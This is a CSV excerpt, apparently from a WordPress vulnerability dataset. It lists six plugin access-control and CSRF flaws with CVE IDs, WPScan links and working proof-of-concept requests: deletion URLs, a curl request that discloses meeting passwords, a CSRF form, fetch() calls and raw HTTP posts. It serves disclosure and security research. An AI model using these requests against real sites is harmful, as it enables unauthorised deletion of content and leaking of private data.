35,multiparcels-shipping-for-woocommerce,< 1.14.14,Subscriber+ Arbitrary Shipment Deletion,"The plugin does not have authorisation when deleting shipment, allowing any authenticated users, such as subscriber to delete arbitrary shipment",CVE-2023-3365,Login as a subscriber an open https://example.com/wp-admin/admin-post.php?action=multiparcels_delete_shipping&id=1 to delete the shipment with ID 1,https://wpscan.com/vulnerability/21ce5baa-8085-4053-8d8b-f7d3e2ae70c1/
36,eventON,< 2.2.8,Unauthenticated Virtual Event Password Disclosure,"The plugins do not have authorisation in an AJAX action, allowing unauthenticated users to retrieve the settings of arbitrary virtual events, including any meeting password set (for example for Zoom)",CVE-2024-0236,"curl -X POST --data ""eid=240"" 'http://127.0.0.1/wp-admin/admin-ajax.php?action=eventon_config_virtual_event'

240 being the ID of a virtual event",https://wpscan.com/vulnerability/09aeb6f2-6473-4de7-8598-e417049896d7/
37,enqueue-anything,<= 1.0.1,Subscriber+ Arbitrary Asset/Post Deletion,"The plugin does not have authorisation and CSRF checks in the remove_asset AJAX action, and does not ensure that the item to be deleted is actually an asset. As a result, low privilege users such as subscriber could delete arbitrary assets, as well as put arbitrary posts in the trash.",CVE-2021-25116,"As a subscriber, or via CSRF against any authenticated user
<html>
  <body>
    <form action=""https://example.com/wp-admin/admin-ajax.php"" method=""POST"">
      <input type=""hidden"" name=""action"" value=""remove_asset"" />
      <input type=""hidden"" name=""id"" value=""289"" />
      <input type=""submit"" value=""Submit request"" />
    </form>
  </body>
</html>",https://wpscan.com/vulnerability/140a15b6-12c8-4f03-a877-3876db866852/
38,wp-edit-menu,< 1.5.0,Unauthenticated Arbitrary Post Deletion,"The plugin does not have authorisation and CSRF in an AJAX action, which could allow unauthenticated attackers to delete arbitrary posts/pages from the blog",CVE-2022-2276,https://example.com/wp-admin/admin-ajax.php?action=filter_menu&val=[post-id],https://wpscan.com/vulnerability/92de9c1b-48dd-4a5f-bbb3-455f8f172b09/
39,ultimate-faqs,< 2.1.2,Subscriber+ Arbitrary FAQ Creation,"The plugin does not have capability and CSRF checks in the ewd_ufaq_welcome_add_faq and ewd_ufaq_welcome_add_faq_page AJAX actions, available to any authenticated users. As a result, any users, with a role as low as Subscriber could create FAQ and FAQ questions",CVE-2021-24968,"fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": new URLSearchParams({""action"":""ewd_ufaq_welcome_add_faq_page"", ""faq_page_title"": ""hello""}),
  ""method"": ""POST"",
  ""credentials"": ""include""
});

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: [any authenticated user]

action=ewd_ufaq_welcome_add_faq_page&faq_page_title=hello

The FAQ will be created as a page (/wp-admin/edit.php?post_type=page&orderby=date&order=desc)


fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": new URLSearchParams({""action"":""ewd_ufaq_welcome_add_faq"", ""faq_question"": ""Have you ever heard the wolf cry to the blue corn moon?"", ""faq_answer"": ""Yes""}),
  ""method"": ""POST"",
  ""credentials"": ""include""
});

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 117
Connection: close
Cookie: [any authenticated user]

action=ewd_ufaq_welcome_add_faq&faq_question=Have+you+ever+heard+the+wolf+cry+to+the+blue+corn+moon%3F&faq_answer=Yes",https://wpscan.com/vulnerability/f0a9e6cc-46cc-4ac2-927a-c006b8e8aa68/
40,stream,< 3.9.2,Subscriber+ Alert Creation,"The plugin does not prevent users with little privileges on the site (like subscribers) from using its alert creation functionality, which may enable them to leak sensitive information.",CVE-2022-4384,"Step 1: Log in as a subscriber
Step 2: Get a nonce from https://example.com/wp-admin/admin-ajax.php?action=get_new_alert_triggers_notifications
Step 3: Configure the alerts via:

fetch(""/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded""
  },""method"":""POST"",
""body"": ""action=save_new_alert&wp_stream_alerts_nonce=XXXX&wp_stream_trigger_author=&wp_stream_trigger_context=users-sessions&wp_stream_trigger_action=login&wp_stream_alert_type=email&wp_stream_alert_status=wp_stream_enabled&wp_stream_email_recipient=recipient%40example.com&wp_stream_email_subject=test"",
});",https://wpscan.com/vulnerability/2b506252-6f37-439e-8984-7316d5cca2e5/
